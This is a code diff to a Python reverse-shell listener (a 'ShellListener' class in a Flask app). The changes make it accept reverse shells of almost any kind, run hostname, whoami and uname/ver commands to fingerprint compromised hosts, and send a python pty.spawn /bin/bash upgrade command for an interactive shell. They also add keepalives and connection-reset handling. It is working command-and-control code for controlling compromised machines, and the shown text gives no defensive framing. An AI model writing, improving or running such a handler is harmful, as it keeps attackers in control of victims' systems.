@@ -193,40 +193,48 @@ class ShellListener:
         shell_id = None
         try:
             with self.app.app_context():
-                # Validate that this is actually a shell, not just a TCP connection
-                conn.settimeout(5)
-                
-                # Send shell detection commands
-                test_commands = [
-                    b'echo "SHELL_VERIFY_TOKEN"\n',
-                    b'whoami\n',
-                    b'id\n'
-                ]
-                
+                # Accept any connection that responds to a probe command.
+                # This supports all shell types: Linux bash/sh, Windows
+                # cmd/PowerShell, macOS zsh, Python/PHP/Ruby/Java shells,
+                # netcat, and any other reverse shell payload.
+                conn.settimeout(10)
+
                 is_valid_shell = False
-                
-                for cmd in test_commands:
+
+                # Strategy: send a universal probe and accept ANY data back.
+                # We try multiple probes to cover different shell flavours.
+                probes = [
+                    b'echo SHELL_OK\n',          # Unix shells, Python pty, nc
+                    b'echo SHELL_OK\r\n',         # Windows cmd / PowerShell
+                ]
+
+                for probe in probes:
                     try:
-                        conn.sendall(cmd)
-                        time.sleep(0.1)  # Short wait for response
-                        response = conn.recv(1024)
-                        
-                        # Check if we got shell-like response
+                        conn.sendall(probe)
+                        time.sleep(1)  # Give slower shells (Windows) time to respond
+                        response = conn.recv(4096)
                         if response and len(response) > 0:
-                            decoded = response.decode('utf-8', errors='ignore')
-                            
-                            # Look for shell prompt indicators or command output
-                            shell_indicators = ['$', '#', '>', 'SHELL_VERIFY_TOKEN', 'uid=', 'gid=']
-                            if any(indicator in decoded for indicator in shell_indicators):
-                                is_valid_shell = True
-                                break
+                            is_valid_shell = True
+                            break
+                    except socket.timeout:
+                        continue
                     except Exception:
                         continue
-                
+
                 if not is_valid_shell:
-                    # Not a valid shell, reject connection
+                    # Last chance: maybe the shell already sent a banner/prompt
+                    # before we sent anything (e.g. some PHP/Ruby/Java shells).
+                    try:
+                        conn.settimeout(3)
+                        banner = conn.recv(4096)
+                        if banner and len(banner) > 0:
+                            is_valid_shell = True
+                    except Exception:
+                        pass
+
+                if not is_valid_shell:
                     conn.close()
-                    print(f"[!] Rejected non-shell connection from {ip}:{port}")
+                    print(f"[!] Rejected non-shell connection from {ip}:{port} (no response to probe)")
                     return
                 
                 # Try to get system info
@@ -264,10 +272,10 @@ class ShellListener:
                         lines = [l for l in cleaned.split('\n') if l.strip()]
                         return lines[-1].strip() if lines else ""
                     
-                    def _send_and_recv(cmd_str: str) -> str:
+                    def _send_and_recv(cmd_str: str, wait: float = 1.0) -> str:
                         """Send a command and receive output."""
                         # Drain any leftover data first
-                        conn.settimeout(0.2)
+                        conn.settimeout(0.3)
                         try:
                             while True:
                                 d = conn.recv(4096)
@@ -275,11 +283,12 @@ class ShellListener:
                                     break
                         except (socket.timeout, OSError):
                             pass
-                        
+
+                        # Send command with both \n and \r\n for cross-platform
                         conn.sendall(cmd_str.encode('utf-8'))
-                        time.sleep(0.5)
+                        time.sleep(wait)
                         chunks = b""
-                        conn.settimeout(1)
+                        conn.settimeout(2)
                         try:
                             while True:
                                 chunk = conn.recv(4096)
@@ -291,37 +300,39 @@ class ShellListener:
                         except Exception:
                             pass
                         return chunks.decode('utf-8', errors='replace')
-                    
-                    # Try to get hostname using markers
-                    hostname_cmd = f'echo {marker_start}; hostname 2>/dev/null || echo unknown; echo {marker_end}\n'
+
+                    # Try to get hostname using markers (works on both Unix and Windows)
+                    hostname_cmd = f'echo {marker_start} && hostname && echo {marker_end}\n'
                     hostname_raw = _send_and_recv(hostname_cmd)
                     hostname = _extract_output(hostname_raw, marker_start, marker_end)
                     if not hostname or hostname == "unknown":
                         hostname = default_hostname
-                    
+
                     # Try to get username using markers
-                    user_cmd = f'echo {marker_start}; whoami 2>/dev/null || echo %USERNAME% 2>nul || echo unknown; echo {marker_end}\n'
+                    user_cmd = f'echo {marker_start} && whoami && echo {marker_end}\n'
                     shell_user_raw = _send_and_recv(user_cmd)
                     shell_user = _extract_output(shell_user_raw, marker_start, marker_end)
                     if not shell_user or shell_user == "unknown":
                         shell_user = "unknown"
-                    
+
                     # Try to detect OS using markers
-                    os_cmd = f'echo {marker_start}; uname -s 2>/dev/null || ver 2>nul || echo unknown; echo {marker_end}\n'
+                    os_cmd = f'echo {marker_start} && (uname -s 2>/dev/null || ver) && echo {marker_end}\n'
                     os_info_raw = _send_and_recv(os_cmd)
                     os_info = _extract_output(os_info_raw, marker_start, marker_end)
-                    if 'Linux' in os_info:
+                    os_info_full = os_info_raw  # Keep full output for broader matching
+                    if 'Linux' in os_info or 'Linux' in os_info_full:
                         platform = 'Linux'
-                    elif 'Darwin' in os_info:
+                    elif 'Darwin' in os_info or 'Darwin' in os_info_full:
                         platform = 'macOS'
-                    elif 'Windows' in os_info or 'Microsoft' in os_info:
+                    elif any(w in os_info_full for w in ['Windows', 'Microsoft', 'MINGW', 'MSYS', 'CYGWIN']):
                         platform = 'Windows'
                     else:
                         platform = 'Unknown'
 
                     # Attempt PTY upgrade on Linux/macOS for a proper
                     # interactive shell (colour, job control, etc.)
-                    if platform in ('Linux', 'macOS'):
+                    # Skip for Windows shells where PTY upgrade doesn't apply.
+                    if platform in ('Linux', 'macOS', 'Unknown'):
                         try:
                             pty_cmd = (
                                 "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null "
@@ -331,9 +342,9 @@ class ShellListener:
                                 "|| script -qc /bin/sh /dev/null 2>/dev/null\n"
                             )
                             conn.sendall(pty_cmd.encode('utf-8'))
-                            time.sleep(0.5)
+                            time.sleep(1)
                             # Drain the PTY upgrade output
-                            conn.settimeout(1)
+                            conn.settimeout(2)
                             try:
                                 while True:
                                     d = conn.recv(4096)
@@ -410,10 +421,14 @@ class ShellListener:
                                     db.session.commit()
                             continue
 
-                        # Use a no-op comment command for keepalive instead
-                        # of bare newlines which pollute the shell buffer.
+                        # Keepalive: send an empty echo which is silent on
+                        # both Unix and Windows shells.
                         conn.settimeout(30)
-                        conn.sendall(b'# keepalive\n')
+                        try:
+                            conn.sendall(b'echo .\n')
+                        except (BrokenPipeError, ConnectionResetError, OSError):
+                            print(f"[-] Keepalive failed for shell {shell_id} — connection broken")
+                            break
                         # Drain the keepalive response so it doesn't
                         # bleed into the next real command.
                         time.sleep(0.3)
@@ -433,6 +448,9 @@ class ShellListener:
                             if shell_record:
                                 shell_record.last_seen = datetime.utcnow()
                                 db.session.commit()
+                    except (BrokenPipeError, ConnectionResetError):
+                        print(f"[-] Shell {shell_id} connection reset")
+                        break
                     except Exception:
                         break
                         
